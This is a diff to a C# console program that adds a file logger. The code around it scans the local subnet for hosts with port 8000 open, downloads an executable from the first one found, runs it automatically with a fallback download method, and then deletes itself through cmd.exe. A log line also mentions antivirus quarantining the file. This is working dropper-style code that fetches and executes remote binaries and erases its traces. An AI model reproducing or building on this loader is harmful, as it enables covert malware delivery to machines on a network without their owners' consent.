@@ -4,7 +4,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
-using System.Net.NetworkInformation; // Added for network interface information
+using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Reflection;
 using System.Text;
@@ -13,6 +13,46 @@ using System.Threading.Tasks;
 
 namespace App
 {
+    // --- New Logger Class ---
+    public static class Logger
+    {
+        private static string _logFilePath;
+        private static object _lock = new object();
+        private static bool _initialized = false;
+
+        public static void Initialize(string baseDirectory)
+        {
+            if (_initialized) return;
+
+            _logFilePath = Path.Combine(baseDirectory, $"AppLog_{DateTime.Now:yyyyMMdd_HHmmss}.txt");
+            _initialized = true;
+            Log("Logger initialized. Log file: " + _logFilePath);
+        }
+
+        public static void Log(string message)
+        {
+            string logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
+            Console.WriteLine(logEntry); // Always write to console
+
+            if (_initialized)
+            {
+                lock (_lock)
+                {
+                    try
+                    {
+                        File.AppendAllText(_logFilePath, logEntry + Environment.NewLine);
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[LOGGER ERROR] Failed to write to log file: {ex.Message}");
+                    }
+                }
+            }
+        }
+    }
+    // --- End New Logger Class ---
+
+
     internal class Program
     {
         private const int TargetPort = 8000;
@@ -44,17 +84,17 @@ namespace App
 
         private static async Task<string> FindServerIpAsync() // No longer takes ipRangeStart/End as args
         {
-            Console.WriteLine("Attempting to determine local IP range for scanning...");
+            Logger.Log("Attempting to determine local IP range for scanning...");
             IPAddress localIp = GetLocalIPAddress();
 
             if (localIp == null)
             {
-                Console.WriteLine("Could not determine local IP address. Cannot scan local network.");
-                Console.WriteLine("Please ensure network connection is active.");
+                Logger.Log("Could not determine local IP address. Cannot scan local network.");
+                Logger.Log("Please ensure network connection is active.");
                 return null;
             }
 
-            Console.WriteLine($"Local IP detected: {localIp}");
+            Logger.Log($"Local IP detected: {localIp}");
             byte[] ipBytes = localIp.GetAddressBytes();
 
             // Construct a Class C subnet range based on the local IP (e.g., 192.168.1.x)
@@ -62,7 +102,7 @@ namespace App
             string ipRangeStart = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.1";
             string ipRangeEnd = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.254";
 
-            Console.WriteLine($"Scanning local IP range {ipRangeStart} - {ipRangeEnd} for open port {TargetPort}...");
+            Logger.Log($"Scanning local IP range {ipRangeStart} - {ipRangeEnd} for open port {TargetPort}...");
 
             List<Task<string>> scanTasks = new List<Task<string>>();
             SemaphoreSlim semaphore = new SemaphoreSlim(MaxParallelScans);
@@ -80,7 +120,7 @@ namespace App
                     {
                         if (serverFoundAndDownloaded) return null;
 
-                        // Console.WriteLine($"Checking {currentIp}:{TargetPort}..."); // Can be noisy
+                        // Logger.Log($"Checking {currentIp}:{TargetPort}..."); // Can be noisy
                         using (var client = new TcpClient())
                         {
                             var connectTask = client.ConnectAsync(IPAddress.Parse(currentIp), TargetPort);
@@ -88,7 +128,7 @@ namespace App
 
                             if (completedTask == connectTask && client.Connected)
                             {
-                                Console.WriteLine($"[FOUND] Open port {TargetPort} at {currentIp}");
+                                Logger.Log($"[FOUND] Open port {TargetPort} at {currentIp}");
                                 return currentIp;
                             }
                         }
@@ -96,7 +136,7 @@ namespace App
                     catch (Exception ex)
                     {
                         // Specific errors like "No connection could be made because the target machine actively refused it" are normal for closed ports
-                        // Console.WriteLine($"Error checking {currentIp}: {ex.Message}"); 
+                        // Logger.Log($"Error checking {currentIp}: {ex.Message}"); 
                     }
                     finally
                     {
@@ -120,14 +160,14 @@ namespace App
                 }
             }
 
-            Console.WriteLine("Server not found within the local IP range.");
+            Logger.Log("Server not found within the local IP range.");
             return null;
         }
 
 
         private static void DownloadAndRunFile(string download_url, string save_path)
         {
-            Console.WriteLine($"Attempting download: {download_url} -> {save_path}");
+            Logger.Log($"Attempting download: {download_url} -> {save_path}");
 
             try
             {
@@ -141,11 +181,11 @@ namespace App
                     {
                         File.SetAttributes(save_path, FileAttributes.Normal);
                         File.Delete(save_path);
-                        Console.WriteLine("Deleted existing file at destination.");
+                        Logger.Log("Deleted existing file at destination.");
                     }
                     catch (Exception delEx)
                     {
-                        Console.WriteLine("Warning: could not delete existing file: " + delEx.Message);
+                        Logger.Log("Warning: could not delete existing file: " + delEx.Message);
                     }
                 }
 
@@ -155,8 +195,8 @@ namespace App
                     client.DownloadFile(download_url, save_path);
                 }
 
-                Console.WriteLine("Download succeeded with WebClient.");
-                Console.WriteLine("Saved file location: " + save_path);
+                Logger.Log("Download succeeded with WebClient.");
+                Logger.Log("Saved file location: " + save_path);
 
                 try
                 {
@@ -164,23 +204,23 @@ namespace App
                 }
                 catch (Exception attrEx)
                 {
-                    Console.WriteLine("Could not set attributes: " + attrEx.Message);
+                    Logger.Log("Could not set attributes: " + attrEx.Message);
                 }
 
                 try
                 {
-                    Console.WriteLine("Starting downloaded file...");
+                    Logger.Log("Starting downloaded file...");
                     Process.Start(new ProcessStartInfo { FileName = save_path, UseShellExecute = true });
                 }
                 catch (Exception startEx)
                 {
-                    Console.WriteLine("Failed to start the downloaded file: " + startEx.Message);
+                    Logger.Log("Failed to start the downloaded file: " + startEx.Message);
                 }
             }
             catch (Exception exWebClient)
             {
-                Console.WriteLine("WebClient failed: " + exWebClient.GetType().Name + " - " + exWebClient.Message);
-                Console.WriteLine("Trying HttpWebRequest fallback...");
+                Logger.Log("WebClient failed: " + exWebClient.GetType().Name + " - " + exWebClient.Message);
+                Logger.Log("Trying HttpWebRequest fallback...");
 
                 try
                 {
@@ -193,8 +233,8 @@ namespace App
                         stream.CopyTo(fs);
                     }
 
-                    Console.WriteLine("Download succeeded with HttpWebRequest fallback.");
-                    Console.WriteLine("Saved file location: " + save_path);
+                    Logger.Log("Download succeeded with HttpWebRequest fallback.");
+                    Logger.Log("Saved file location: " + save_path);
 
                     try
                     {
@@ -202,7 +242,7 @@ namespace App
                     }
                     catch (Exception attrEx2)
                     {
-                        Console.WriteLine("Could not set attributes: " + attrEx2.Message);
+                        Logger.Log("Could not set attributes: " + attrEx2.Message);
                     }
 
                     try
@@ -211,13 +251,13 @@ namespace App
                     }
                     catch (Exception startEx2)
                     {
-                        Console.WriteLine("Failed to start the downloaded file: " + startEx2.Message);
+                        Logger.Log("Failed to start the downloaded file: " + startEx2.Message);
                     }
                 }
                 catch (Exception exFallback)
                 {
-                    Console.WriteLine("Fallback failed: " + exFallback.GetType().Name + " - " + exFallback.Message);
-                    Console.WriteLine("Ensure the server is running, the URL is correct, and no AV is quarantining the file.");
+                    Logger.Log("Fallback failed: " + exFallback.GetType().Name + " - " + exFallback.Message);
+                    Logger.Log("Ensure the server is running, the URL is correct, and no AV is quarantining the file.");
                 }
             }
         }
@@ -235,11 +275,19 @@ namespace App
                     FileName = "cmd.exe"
                 });
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Logger.Log($"Self-delete failed: {ex.Message}");
+            }
         }
 
         static async Task Main() // Still async Task Main
         {
+            // --- Initialize the Logger first ---
+            Logger.Initialize(AppContext.BaseDirectory);
+            Logger.Log("Application started.");
+            // -----------------------------------
+
             // The IP range is now determined dynamically
             string foundServerIp = await FindServerIpAsync();
 
@@ -251,10 +299,11 @@ namespace App
             }
             else
             {
-                Console.WriteLine("Could not find an accessible server for test.exe on the local network.");
+                Logger.Log("Could not find an accessible server for test.exe on the local network.");
             }
 
-            Console.WriteLine("Finished. Press Enter to exit.");
+            Logger.Log("Finished. Press Enter to exit.");
+            // Console.ReadLine() is still useful for interactive debugging, but won't be logged by the Logger directly
             Console.ReadLine();
         }
     }
